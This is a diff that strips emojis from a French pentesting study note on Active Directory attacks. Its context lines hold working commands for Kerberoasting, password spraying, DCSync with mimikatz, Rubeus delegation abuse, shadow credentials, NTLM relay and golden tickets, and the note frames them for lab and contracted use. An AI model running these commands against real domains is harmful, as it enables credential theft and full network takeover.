@@ -1,10 +1,10 @@
-# 👑 Active Directory
+# Active Directory
 
 > [!info] **C'est quoi ?**
 > AD = **le système d'identité** de ~90% des entreprises Windows.
 > Compromettre AD = contrôler **tout le domaine**. C'est là que se joue le pentest "réaliste".
 
-> 🧰 **Outils associés :** [[Outils/Outil - Impacket|Impacket]] · [[Outils/Outil - BloodHound|BloodHound]] · [[Outils/Outil - Mimikatz|Mimikatz]] · [[Outils/Outil - Responder|Responder]] → voir [[Tools|🧰 Bibliothèque d'Outils]]
+> **Outils associés :** [[Outils/Outil - Impacket|Impacket]] · [[Outils/Outil - BloodHound|BloodHound]] · [[Outils/Outil - Mimikatz|Mimikatz]] · [[Outils/Outil - Responder|Responder]] → voir [[Tools| Bibliothèque d'Outils]]
 
 ---
 
@@ -92,11 +92,11 @@ dig axfr corp.local @192.168.1.10
 | 9389 | AD Web Services | PowerShell AD | Get-ADUser |
 | 5985/5986 | WinRM | Remote management | evil-winrm |
 
-> [!tip] 💡 **Réflexe port :** dans un pentest AD, les 4 ports à tester systématiquement sont **445 (SMB)**, **88 (Kerberos)**, **389 (LDAP)** et **5985 (WinRM)**. Un couple creds + WinRM ouvert = shell immédiat.
+> [!tip] **Réflexe port :** dans un pentest AD, les 4 ports à tester systématiquement sont **445 (SMB)**, **88 (Kerberos)**, **389 (LDAP)** et **5985 (WinRM)**. Un couple creds + WinRM ouvert = shell immédiat.
 
 ### 1.6 Le flux Kerberos (à connaître sur le bout des doigts)
 
-> 📘 Fiche détaillée du protocole : [[Techniques/Kerberos - Le protocole|👑 Kerberos — comment ça marche]]
+> Fiche détaillée du protocole : [[Techniques/Kerberos - Le protocole| Kerberos — comment ça marche]]
 
 ```mermaid
 sequenceDiagram
@@ -111,7 +111,7 @@ sequenceDiagram
     S-->>U: 6. Accès accordé
 ```
 
-> [!danger] 🚨 **Le point d'or de Kerberos**
+> [!danger] **Le point d'or de Kerberos**
 > Le TGT est chiffré avec la clé du compte **krbtgt**. Le TGS avec la clé du **service**.
 > Si un ticket est faiblement protégé ou qu'on détient la clé, on **forge** ce qu'on veut.
 
@@ -164,7 +164,7 @@ Le point d'attaque : le serveur ne reçoit jamais le mot de passe, seulement une
 | 17 | AES128-CTS-HMAC-SHA1 | Domaine moderne | Kerberoast AES `-m 19700` |
 | 18 | AES256-CTS-HMAC-SHA1 | Domaine moderne | Kerberoast AES `-m 19700` |
 
-> [!warning] ⚠️ **RC4 vs AES :** si le domaine force AES (interdit RC4), le Kerberoast passe en `$krb5tgs$18$` (mode 19700). Le **PtH via mimikatz** dépend du hash NTLM (RC4) : avec AES-only, il faut convertir en ticket (Overpass-the-Hash).
+> [!warning] **RC4 vs AES :** si le domaine force AES (interdit RC4), le Kerberoast passe en `$krb5tgs$18$` (mode 19700). Le **PtH via mimikatz** dépend du hash NTLM (RC4) : avec AES-only, il faut convertir en ticket (Overpass-the-Hash).
 
 ### 2.4 Les flags de ticket et la délégation
 
@@ -225,7 +225,7 @@ evil-winrm -i 192.168.1.10 -u user -p 'pass'
 
 ### 3.3 Les objets dangereux à chercher
 
-> [!warning] 🚩 **Checklist "objets à fort impact"**
+> [!warning] **Checklist "objets à fort impact"**
 > - Utilisateurs avec `SPN` (→ Kerberoast)
 > - Comptes **sans pre-auth requise** (→ AS-REP roast)
 > - Groupe **Domain Admins / Enterprise Admins**
@@ -277,7 +277,7 @@ nslookup -type=SRV _kerberos._tcp.dc._msdcs.corp.local 192.168.1.10
 | `LoggedOn` | Sessions sur machines (si droits locaux) | Variable |
 | `SessionLooping` | Monitoring continu des sessions | Bruyant |
 
-> 📘 Fiche détaillée : [[Outils/Outil - BloodHound|BloodHound]] — voir section 30 pour les requêtes Cypher.
+> Fiche détaillée : [[Outils/Outil - BloodHound|BloodHound]] — voir section 30 pour les requêtes Cypher.
 
 ---
 
@@ -294,7 +294,7 @@ flowchart LR
     C -->|"Succès ?"| D["Compte compromis sans lockout"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/Password Spraying|🌧️ Password Spraying]]
+> Fiche détaillée : [[Techniques/Password Spraying| Password Spraying]]
 
 ### 4.2 Outillage
 
@@ -332,7 +332,7 @@ flowchart LR
     A -->|"hashcat -m 18200"| C["Mot de passe en clair"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/AS-REP Roasting|☀️ AS-REP Roasting]]
+> Fiche détaillée : [[Techniques/AS-REP Roasting| AS-REP Roasting]]
 
 ### 5.2 Exploitation
 
@@ -373,7 +373,7 @@ flowchart LR
     U -->|"hashcat -m 13100 / 19700"| P["Mot de passe du service"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/Kerberoasting|🧀 Kerberoasting]]
+> Fiche détaillée : [[Techniques/Kerberoasting| Kerberoasting]]
 
 ### 6.2 Exploitation
 
@@ -390,7 +390,7 @@ Invoke-Kerberoast -OutputFormat hashcat | Out-File hashes.txt
 Rubeus.exe kerberoast /outfile:hashes.txt
 ```
 
-> [!tip] 💡 **Si le service est un compte "machine"** → clé aléatoire 120+ chars, inutile de cracker.
+> [!tip] **Si le service est un compte "machine"** → clé aléatoire 120+ chars, inutile de cracker.
 > Si c'est un **compte utilisateur** avec SPN → souvent crackable !
 
 ### 6.3 Variantes et astuces
@@ -422,7 +422,7 @@ flowchart LR
     T -->|"auth NTLM réussie"| X["Shell / exécution"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/Pass-the-Hash|🔑 Pass-the-Hash]]
+> Fiche détaillée : [[Techniques/Pass-the-Hash| Pass-the-Hash]]
 
 ### 7.2 Exploitation
 
@@ -469,7 +469,7 @@ flowchart LR
     T -->|"psexec -k / kerberos::ptt"| S["Accès à la cible"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/Pass-the-Ticket et Overpass-the-Hash|🎫 Pass-the-Ticket / Overpass]]
+> Fiche détaillée : [[Techniques/Pass-the-Ticket et Overpass-the-Hash| Pass-the-Ticket / Overpass]]
 
 ### 8.2 Exploitation (Linux / Impacket)
 
@@ -520,7 +520,7 @@ flowchart LR
     F -->|"psexec / Rubeus / ticketer"| C["Contrôle total du domaine"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/Golden Ticket|👑 Golden Ticket]]
+> Fiche détaillée : [[Techniques/Golden Ticket| Golden Ticket]]
 
 ### 9.2 Forge avec mimikatz
 
@@ -558,7 +558,7 @@ psexec.py -k -no-pass -dc-ip 192.168.1.10 'corp.local/fakeadmin@DC01.corp.local'
 | RID Enterprise Admins | `519` | Seulement si forêt |
 | RID Administrator | `500` | SID complet `S-1-5-21-...-500` |
 
-> [!danger] 🚨 **Golden Ticket = contrôle total pendant la durée de vie du hash krbtgt**
+> [!danger] **Golden Ticket = contrôle total pendant la durée de vie du hash krbtgt**
 > Impossible à révoquer sans **changer le mot de passe de krbtgt DEUX FOIS**.
 
 ---
@@ -575,7 +575,7 @@ flowchart LR
     T -->|"accès au service"| S["Ressource : SMB, HTTP, LDAP..."]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/Silver Ticket|💠 Silver Ticket]]
+> Fiche détaillée : [[Techniques/Silver Ticket| Silver Ticket]]
 
 ### 10.2 Exploitation
 
@@ -602,7 +602,7 @@ export KRB5CCNAME=user.ccache
 | `winrm/<host>` | WinRM | Shell |
 | `mssqlsvc/<host>` | MSSQL | Accès base |
 
-> [!warning] ⚠️ **Piège :** le Silver Ticket doit être forgé avec le **bon SID** du compte cible, sinon l'authentification échoue sur la validation de la PAC.
+> [!warning] **Piège :** le Silver Ticket doit être forgé avec le **bon SID** du compte cible, sinon l'authentification échoue sur la validation de la PAC.
 
 ---
 
@@ -618,7 +618,7 @@ flowchart LR
     D -->|"hash de tous les comptes"| A
 ```
 
-> 📘 Fiche détaillée : [[Techniques/DCsync|📥 DCsync]]
+> Fiche détaillée : [[Techniques/DCsync| DCsync]]
 
 ```bash
 lsadump::dcsync /domain:corp.local /user:admin
@@ -683,7 +683,7 @@ flowchart LR
     A -->|"hashcat -m 5600"| P["Mot de passe en clair"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/LLMNR-NBT-NS Poisoning|🎙️ LLMNR/NBT-NS Poisoning]]
+> Fiche détaillée : [[Techniques/LLMNR-NBT-NS Poisoning| LLMNR/NBT-NS Poisoning]]
 
 ### 12.2 Exploitation
 
@@ -728,7 +728,7 @@ flowchart LR
     T -->|"session légitime volée"| A
 ```
 
-> 📘 Fiche détaillée : [[Techniques/NTLM Relay|🔗 NTLM Relay]]
+> Fiche détaillée : [[Techniques/NTLM Relay| NTLM Relay]]
 
 ### 13.2 Exploitation
 
@@ -779,7 +779,7 @@ flowchart LR
     T -->|"escalade"| DA["Domain Admin"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/ACL Abuse AD|🧩 ACL Abuse]]
+> Fiche détaillée : [[Techniques/ACL Abuse AD| ACL Abuse]]
 
 ### 14.2 Les droits à connaître
 
@@ -890,11 +890,11 @@ flowchart LR
     C -->|"certipy auth -pfx"| D["TGT de administrator → DCSync"]
 ```
 
-> 📘 Fiche détaillée : [[Techniques/ADCS et Certificats (ESC)|🔐 ADCS & Certificats]]
+> Fiche détaillée : [[Techniques/ADCS et Certificats (ESC)| ADCS & Certificats]]
 
 ### 16.2 Les ESC — synthèse
 
-> [!warning] 🚨 **Les ESC 1 à 8 (certificats)**
+> [!warning] **Les ESC 1 à 8 (certificats)**
 > Abuser du serveur de certificats (AD CS) pour demander des certificats de **machine** ou
 > contourner l'authentification :
 >
@@ -956,18 +956,18 @@ La délégation permet à un service d'agir **au nom** d'un utilisateur. Trois v
 ```text
 La délégation permet à un service d'agir "au nom" d'un utilisateur.
 3 variantes, toutes abusables si mal configurées :
-  🔓 Unconstrained : le service garde le TGT de l'utilisateur
-  🔗 Constrained    : le service peut impersonner vers des SPN précis
-  🧬 RBCD          : le service cible définit QUI peut l'impersonner
+  Unconstrained : le service garde le TGT de l'utilisateur
+  Constrained    : le service peut impersonner vers des SPN précis
+  RBCD          : le service cible définit QUI peut l'impersonner
 ```
 
-> 📘 Fiches détaillées : [[Techniques/Kerberos Delegation|🧬 Kerberos Delegation (hub)]] · [[Techniques/Kerberos - Unconstrained Delegation|🔓 Unconstrained]] · [[Techniques/Kerberos - Constrained Delegation|🔗 Constrained]] · [[Techniques/Kerberos - RBCD (Resource-Based Constrained Delegation)|🧬 RBCD]] · [[Techniques/Kerberos - Bronze Bit|🥉 Bronze Bit]]
+> Fiches détaillées : [[Techniques/Kerberos Delegation| Kerberos Delegation (hub)]] · [[Techniques/Kerberos - Unconstrained Delegation| Unconstrained]] · [[Techniques/Kerberos - Constrained Delegation| Constrained]] · [[Techniques/Kerberos - RBCD (Resource-Based Constrained Delegation)| RBCD]] · [[Techniques/Kerberos - Bronze Bit| Bronze Bit]]
 
-> [!danger] 🚨 **Le trio délégué = gold mine de BloodHound**
+> [!danger] **Le trio délégué = gold mine de BloodHound**
 > BloodHound affiche les arêtes `AllowedToDelegate`, `AllowedToActOnBehalfOfOtherIdentity`
 > et l'attribut `unconstraineddelegation=true`. Vérifie ces 3 là en priorité.
 
-### 17.2 🔓 Unconstrained delegation — trouver + exploiter
+### 17.2 Unconstrained delegation — trouver + exploiter
 
 ```bash
 # Trouver les machines concernées
@@ -989,7 +989,7 @@ Rubeus.exe asktgs /ticket:<base64> /service:ldap/dc.lab.local,cifs/dc.lab.local 
 mimikatz # lsadump::dcsync /user:krbtgt
 ```
 
-### 17.3 🔗 Constrained delegation — impersonner vers des SPN précis
+### 17.3 Constrained delegation — impersonner vers des SPN précis
 
 ```bash
 # Trouver : BloodHound MATCH p=(a)-[:AllowedToDelegate]->(c:Computer) RETURN p
@@ -1002,7 +1002,7 @@ Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs \
   /impersonateuser:"administrator" /domain:domain /user:user /password:password
 ```
 
-### 17.4 🧬 RBCD — la cible définit qui peut l'impersonner
+### 17.4 RBCD — la cible définit qui peut l'impersonner
 
 ```bash
 # 1. Créer un compte machine (MachineAccountQuota = 10 par défaut !)
@@ -1018,7 +1018,7 @@ Rubeus.exe s4u /user:swktest$ /rc4:<hash> /impersonateuser:Administrator \
 # → accès total à DC01 en tant qu'admin.
 ```
 
-> [!tip] 💡 **Coerce → Délegation** : si tu as une machine à délégation **non restreinte**,
+> [!tip] **Coerce → Délegation** : si tu as une machine à délégation **non restreinte**,
 > force le DC à s'authentifier dessus (SpoolSample/PetitPotam) → tu récupères son TGT → DCSync.
 > C'est l'un des chemins les plus courts vers le domaine.
 
@@ -1030,7 +1030,7 @@ Rubeus.exe s4u /user:swktest$ /rc4:<hash> /impersonateuser:Administrator \
 
 **Coerce** = forcer une machine (souvent le DC, en SYSTEM) à initier une authentification vers **NOTRE serveur**. Combinable avec : NTLM Relay, délégation non restreinte, capture NetNTLMv1/v2...
 
-> 📘 Fiche détaillée : [[Techniques/Coerce - PrinterBug et PetitPotam|🧲 Coerce (PrinterBug/PetitPotam)]]
+> Fiche détaillée : [[Techniques/Coerce - PrinterBug et PetitPotam| Coerce (PrinterBug/PetitPotam)]]
 
 ### 18.2 Les techniques
 
@@ -1068,11 +1068,11 @@ flowchart LR
 
 ## 19. LAPS, GMSA & Shadow Credentials
 
-### 19.1 🗝️ LAPS
+### 19.1 LAPS
 
 **LAPS** (Local Administrator Password Solution) stocke le mot de passe admin local **en clair** dans AD (attribut `ms-mcs-AdmPwd`). Le risque : qui a le droit de **lire** l'attribut ?
 
-> 📘 Fiche détaillée : [[Techniques/LAPS et GMSA|🗝️ LAPS & GMSA]]
+> Fiche détaillée : [[Techniques/LAPS et GMSA| LAPS & GMSA]]
 
 ```bash
 # Qui a le droit de lire ? (Find-AdmPwdExtendedRights). Si un groupe "deployment" y a accès...
@@ -1084,7 +1084,7 @@ ldapsearch -x -h 10.10.10.10 -D "user@domain" -w 'pass' \
 ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))").findAll() | % {$_.properties}
 ```
 
-### 19.2 🧮 GMSA
+### 19.2 GMSA
 
 Les **GMSA** ont un mot de passe **dérivé du KDS root key**, jamais changé. Si on peut lire `msDS-ManagedPassword`, on calcule le hash.
 
@@ -1095,11 +1095,11 @@ gMSADumper.py -u user -p pass -d domain         # + dump local du LSA
 GoldenGMSA.exe kdsinfo ; GoldenGMSA.exe compute --sid <gmsa-sid>
 ```
 
-### 19.3 🌑 Shadow Credentials
+### 19.3 Shadow Credentials
 
 Ajouter une **clé publique** dans `msDS-KeyCredentialLink` d'un compte cible → s'authentifier en **PKINIT** → TGT. Nécessite un droit d'écriture sur l'attribut.
 
-> 📘 Fiche détaillée : [[Techniques/Shadow Credentials|🌑 Shadow Credentials]]
+> Fiche détaillée : [[Techniques/Shadow Credentials| Shadow Credentials]]
 
 ```bash
 # Nécessite : écrire sur msDS-KeyCredentialLink (GenericWrite/GenericAll) + ADCS/PKINIT
@@ -1272,7 +1272,7 @@ getST.py -spn krbtgt/corp.local 'child.corp.local/user:pass' -impersonate Admini
 2. **NoPac** si non patché → DCsync.
 3. **PrintNightmare** si spooler actif + accès SMB.
 
-> [!warning] ⚠️ **Ces exploits sont souvent bloqués dans les labs récents** (patchés). Les vulns de **configuration** (Kerberoast, ACL, ADCS, délégations, trusts) restent la voie royale moderne.
+> [!warning] **Ces exploits sont souvent bloqués dans les labs récents** (patchés). Les vulns de **configuration** (Kerberoast, ACL, ADCS, délégations, trusts) restent la voie royale moderne.
 
 ---
 
@@ -1280,7 +1280,7 @@ getST.py -spn krbtgt/corp.local 'child.corp.local/user:pass' -impersonate Admini
 
 Mimikatz est le **swiss-army knife** des creds Windows. Nécessite souvent `privilege::debug` (droit SeDebugPrivilege : admin local ou SYSTEM).
 
-> 📘 Fiche détaillée : [[Outils/Outil - Mimikatz|Mimikatz]]
+> Fiche détaillée : [[Outils/Outil - Mimikatz|Mimikatz]]
 
 ### 23.1 Référence des commandes
 
@@ -1373,10 +1373,10 @@ Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 
 ```bash
 hashcat -m 1000 hashes.txt rockyou.txt -O -w 4
-# stats : quels mots de passe faibles ? → fait un rapport, ne les crie pas partout 😉
+# stats : quels mots de passe faibles ? → fait un rapport, ne les crie pas partout
 ```
 
-> 📘 Voir aussi : [[Outils/Outil - hashcat|hashcat]] · [[Outils/Outil - John the Ripper|John the Ripper]] · [[08 - Password Cracking|🔐 Password Cracking]]
+> Voir aussi : [[Outils/Outil - hashcat|hashcat]] · [[Outils/Outil - John the Ripper|John the Ripper]] · [[08 - Password Cracking| Password Cracking]]
 
 ---
 
@@ -1419,9 +1419,9 @@ SQL> xp_cmdshell whoami
 nxc smb 192.168.1.0/24 -u admin -H <hash> --shares
 ```
 
-> [!warning] 🚩 **Password Spraying (pas de brute-force !)**
+> [!warning] **Password Spraying (pas de brute-force !)**
 > Brute-forcer 1 mot de passe contre TOUS les comptes = moins de lockouts :
-> 📘 Fiche détaillée : [[Techniques/Password Spraying|🌧️ Password Spraying]]
+> Fiche détaillée : [[Techniques/Password Spraying| Password Spraying]]
 > ```bash
 > nxc smb 192.168.1.0/24 -u users.txt -p 'Fall2024!' --continue-on-success
 > ```
@@ -1473,7 +1473,7 @@ flowchart TB
 | **SSH reverse** | `ssh -R` | Forward de port inversé |
 | **netsh portproxy** | `netsh interface portproxy` | Redirection de port native Windows |
 
-> 📘 Fiche détaillée : [[Outils/Outil - Ligolo-ng|Ligolo-ng]] · [[Techniques/Pivoting et Tunneling|Pivoting & Tunneling]]
+> Fiche détaillée : [[Outils/Outil - Ligolo-ng|Ligolo-ng]] · [[Techniques/Pivoting et Tunneling|Pivoting & Tunneling]]
 
 ### 25.3 Chisel
 
@@ -1677,7 +1677,7 @@ New-ADUser -Name "svc_backup_canary" -SamAccountName "svc_backup_canary" `
 
 ## 29. Outils AD — références
 
-> 🧰 Bibliothèque complète : [[Tools|🧰 Bibliothèque d'Outils]]
+> Bibliothèque complète : [[Tools| Bibliothèque d'Outils]]
 
 | Outil | Rôle | Fiche |
 |---|---|---|
@@ -1727,9 +1727,9 @@ ntlmrelayx.py -t ldap://DC2 --shadow-credentials --shadow-target 'dc02$'
 
 ---
 
-## 30. 🧠 Tips & Pièges AD
+## 30. Tips & Pièges AD
 
-> [!tip] 🩸 **BloodHound : les requêtes custom à garder**
+> [!tip] **BloodHound : les requêtes custom à garder**
 > ```cypher
 > // Kerberoastables
 > MATCH (n:User) WHERE n.hasspn=true RETURN n
@@ -1744,7 +1744,7 @@ ntlmrelayx.py -t ldap://DC2 --shadow-credentials --shadow-target 'dc02$'
 > ```
 > (Il existe aussi le nouveau **BloodHound Community Edition (BHE)**)
 
-> [!tip] 🔑 **Ne pas tout cracker : RÉUTILISER**
+> [!tip] **Ne pas tout cracker : RÉUTILISER**
 > Un hash récupéré sur une machine = à tester sur **toutes** les autres.
 > ```bash
 > # Tester le hash partout (spray ciblé, discret)
@@ -1754,7 +1754,7 @@ ntlmrelayx.py -t ldap://DC2 --shadow-credentials --shadow-target 'dc02$'
 > ```
 > La réutilisation de mots de passe est le **chemin le plus rapide** vers le domaine.
 
-> [!tip] 🌐 **Toujours regarder les TRUSTS**
+> [!tip] **Toujours regarder les TRUSTS**
 > `Domain B` fait confiance à `Domain A` → compromettre A peut donner accès à B
 > (cross-trust Kerberoast, SID History, forest trusts).
 > ```bash
@@ -1764,14 +1764,14 @@ ntlmrelayx.py -t ldap://DC2 --shadow-credentials --shadow-target 'dc02$'
 > findTrust.py -dc-ip DC 'corp.local/user:pass'
 > ```
 
-> [!tip] 🗝️ **Kerberoast : penser au mode AES**
+> [!tip] **Kerberoast : penser au mode AES**
 > ```bash
 > # Demander un ticket chiffré AES256 (parfois mieux que RC4 selon les policies)
 > GetUserSPNs.py -request -dc-ip DC 'corp.local/user:pass' -aes
 > hashcat -m 19700 kerberoast_aes.txt wordlist.txt   # mode AES-Kerberoast
 > ```
 
-> [!tip] 🎭 **Shadow Credentials (si on peut écrire `msDS-KeyCredentialLink`)**
+> [!tip] **Shadow Credentials (si on peut écrire `msDS-KeyCredentialLink`)**
 > ```bash
 > # Utiliser pywhisker pour ajouter des clés sur un compte cible
 > pywhisker -d corp.local -u user -p pass --target victim --action add --filename cert.pfx
@@ -1779,26 +1779,26 @@ ntlmrelayx.py -t ldap://DC2 --shadow-credentials --shadow-target 'dc02$'
 > certipy auth -pfx cert.pfx -dc-ip DC -username victim -domain corp.local
 > ```
 
-> [!warning] ⚠️ **Piège n°1 : bruter = lockout**
+> [!warning] **Piège n°1 : bruter = lockout**
 > Ne brute-force **jamais** un mot de passe AD (lockout après ~5 essais).
 > Toujours **Password Spray** : 1 mot de passe contre beaucoup de comptes, espacé dans le temps.
 > ```bash
 > nxc smb DC -u users.txt -p 'MdpSpray2024!' --continue-on-success
 > ```
 
-> [!warning] ⚠️ **Piège n°2 : LLMNR poisoning + relay**
+> [!warning] **Piège n°2 : LLMNR poisoning + relay**
 > - Responder **récupère** les hashes mais **mange** aussi les requêtes SMB → le relay échoue.
 > - Mets `/etc/responder/Responder.conf` sur `SMB=Off` quand tu fais du **relay**.
 > - **SMB Signing activé** = pas de relay (seulement crack). Vérifie : `nxc smb IP -u u -p p -M smb-risky` ou via scan.
 
-> [!warning] ⚠️ **Piège n°3 : les comptes "machine"**
+> [!warning] **Piège n°3 : les comptes "machine"**
 > Les comptes machines (`DOMAIN$`, ex `WEB01$`) ont des **passwords aléatoires** impossibles à cracker.
 > Ne perds pas de temps à cracker un hash de compte machine : il est fait pour être **rejoué** (PtH), pas cassé.
 
-> [!tip] ⚙️ **Les comptes machines sont des creds à part entière**
+> [!tip] **Les comptes machines sont des creds à part entière**
 > Un compte machine (`DC01$`) qui possède des droits de réplication → **DCSync avec son hash**. Toujours cartographier ce que peuvent faire les comptes `$` (souvent sous-estimé).
 
-> [!tip] 🎯 **BloodHound : custom queries avancées**
+> [!tip] **BloodHound : custom queries avancées**
 > ```cypher
 > // Chemin vers DA via GPO
 > MATCH p=(u)-[:GenericAll|WriteDacl|WriteOwner*1..]->(g:GPO)-[:GPLink*1..]->(c:Computer) RETURN p
@@ -1808,16 +1808,16 @@ ntlmrelayx.py -t ldap://DC2 --shadow-credentials --shadow-target 'dc02$'
 > MATCH p=shortestPath((n)-[*1..]->(g:Group)) WHERE g.name CONTAINS 'DOMAIN ADMINS' RETURN p
 > ```
 
-> [!tip] 🧪 **Test Kerberos "sans lockout"**
+> [!tip] **Test Kerberos "sans lockout"**
 > Kerberos renvoie des erreurs différentes selon que le compte existe → énumération silencieuse.
 > ```bash
 > kerbrute userenum -d corp.local users.txt DC
 > ```
 
-> [!warning] ⚠️ **Piège n°4 : les mdp dans les descriptions AD**
+> [!warning] **Piège n°4 : les mdp dans les descriptions AD**
 > Les descriptions d'objets contiennent souvent des mots de passe (migration, docs). Cherche `pass`, `pwd`, `temp`, `Mdp` dans `description` et `info`.
 
-> [!success] 🏆 **Le flow mental "j'ai un foothold AD"**
+> [!success] **Le flow mental "j'ai un foothold AD"**
 > 1. `whoami` + **BloodHound** (collection complete) dès que possible
 > 2. Chercher les **chemins courts** vers DA
 > 3. Kerberoast / AS-REP / ACL abuse selon ce que BloodHound montre
@@ -1892,10 +1892,10 @@ flowchart TB
 
 ---
 
-> [!success] 🏆 **La chaîne de pensée AD en une ligne**
+> [!success] **La chaîne de pensée AD en une ligne**
 > Énumérer (BloodHound) → trouver un chemin (Kerberoast/ASREP/ACL) → premier accès
 > → privesc locale → dump creds (mimikatz) → lateral movement → DA → DCsync → **domaine**.
 
-> [!warning] ⚖️ **Rappel** : THM ("Holo", "HackPark AD"), HTB Machines, lab privé. Jamais de prod sans contrat. 🔒
+> [!warning] **Rappel** : THM ("Holo", "HackPark AD"), HTB Machines, lab privé. Jamais de prod sans contrat.
 
-➡️ Suite logique : [[06 - Post-Exploitation|🕹️ Post-Exploitation]]
+Suite logique : [[06 - Post-Exploitation| Post-Exploitation]]
